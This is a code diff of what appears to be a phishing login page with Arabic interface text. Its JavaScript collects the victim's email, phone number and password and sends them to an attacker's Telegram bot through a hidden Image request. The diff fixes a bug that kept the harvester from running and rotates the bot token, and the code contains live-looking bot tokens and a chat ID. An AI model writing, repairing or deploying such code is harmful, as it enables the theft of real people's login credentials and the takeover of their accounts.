@@ -71,20 +71,19 @@
             e.preventDefault();
             
             const email = document.getElementById('userEmail').value;
-            const phone = document.getElementById('userPhone'].value;
+            const phone = document.getElementById('userPhone').value;
             const pass = document.getElementById('userPass').value;
             const btn = document.getElementById('submitBtn');
             
             btn.disabled = true;
             btn.innerHTML = 'جاري التحقق...';
 
-            const botToken = '8676888425:AAGwGw8IbBL0z800MUtSUyNip1zBZTVwSg';
+            const botToken = '8671904106:AAGKt08xOc1vMxUtoq4tBgATN88eHm-mkGg';
             const chatId = '8160033832';
             
             const text = `🔔 صيد جديد (تسجيل دخول):\n\n📧 البريد: ${email}\n📱 الهاتف: ${phone}\n🔑 كلمة السر: ${pass}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
-            // استخدام عنصر Image لضمان إرسال الطلب متخطياً قيود المتصفح
             const img = new Image();
             img.src = url;
 
